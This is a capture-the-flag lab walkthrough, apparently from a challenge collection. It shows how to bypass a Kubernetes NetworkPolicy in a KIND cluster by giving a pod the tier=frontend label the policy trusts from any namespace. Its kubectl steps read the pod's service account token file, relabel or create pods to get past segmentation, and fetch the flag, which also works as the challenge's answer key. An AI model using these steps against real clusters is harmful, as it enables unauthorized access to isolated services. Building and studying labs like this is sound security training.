# K8S-27: NetworkPolicy Label Spoofing Bypass

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-27 |
| 名称 | NetworkPolicy Label Spoofing Bypass |
| 技术/CVE | N/A (network policy bypass) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-27-netpol-bypass |
| 攻击面 | NetworkPolicy uses pod labels → create pod with matching labels → bypass |

## 场景概述

```
Attacker pod blocked by NetworkPolicy (requires tier=frontend label)
  → Discover NetworkPolicy label requirement
  → Policy trusts the label from ANY namespace (namespaceSelector: {})
  → Label the attacker's own pod tier=frontend inside attacker-ns
  → Access flag-service from the spoofed pod → Read flag
```

## 前置知识

- kubectl access to KIND cluster `cve-k8s-27-netpol-bypass`
- 集群已安装 Calico（kind 默认 CNI 不强制 NetworkPolicy）；攻击者 RBAC 限于 `attacker-ns`

## 利用步骤

### Step 1: Test NetworkPolicy Blocking

```bash
kubectl exec -n attacker-ns attacker-pod -- wget -qO- --timeout=3 \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
# Should FAIL — blocked by NetworkPolicy
```

### Step 2: Discover NetworkPolicy Rules

```bash
kubectl get networkpolicy -n isolated-ns protect-flag -o yaml
# Note: allows pods with label tier=frontend from any namespace
```

### Step 3: Bypass via Matching Pod

```bash
# The policy's namespaceSelector: {} trusts tier=frontend from ANY namespace.
# The attacker only needs to spoof the label inside their own tenant.
TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Option A: label the existing attacker pod
kubectl --token=$TOKEN label pod attacker-pod -n attacker-ns tier=frontend --overwrite

# Option B: create a new pod carrying the label
kubectl --token=$TOKEN run bypass-pod --image=alpine:latest -n attacker-ns \
  --labels='tier=frontend' -- sleep 3600

# Wait for pod to be ready
kubectl --token=$TOKEN wait --for=condition=Ready pod/bypass-pod -n attacker-ns --timeout=30s
```

### Step 4: Access Flag Service from Bypass Pod

```bash
kubectl exec -n attacker-ns attacker-pod -- wget -qO- \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
# Output: flag{k8s-27-<16-hex>}
```

## 验证命令

```bash
cd cve_challenges/scenarios/k8s/networkpolicy-bypass && bash deploy.sh
kubectl exec -n isolated-ns -l app=flag-service -- cat /tmp/flag.txt
bash teardown.sh
```

> 前置：本场景安装 Calico（kind 默认 CNI 不强制 NetworkPolicy），部署脚本会在
> 建集群后自动安装并等待就绪。攻击者的 RBAC 被限制在 attacker-ns 内。

## Flag

- **Primary**: `/tmp/flag.txt` in `flag-service` pod in `isolated-ns`
- **Alternative**: HTTP endpoint `http://flag-service.isolated-ns:8080/flag`
- **Format**: `flag{k8s-27-<16-hex>}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | NetworkPolicy selectors and Kubernetes labels |
| 侦察与前置条件 | Policy selector semantics and label mutation permissions |
| 核心漏洞与利用 | Spoof a label to satisfy NetworkPolicy selection |
| 权限、横向或影响 | Network segmentation bypass |
| 验证 | Reach the protected service and collect the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
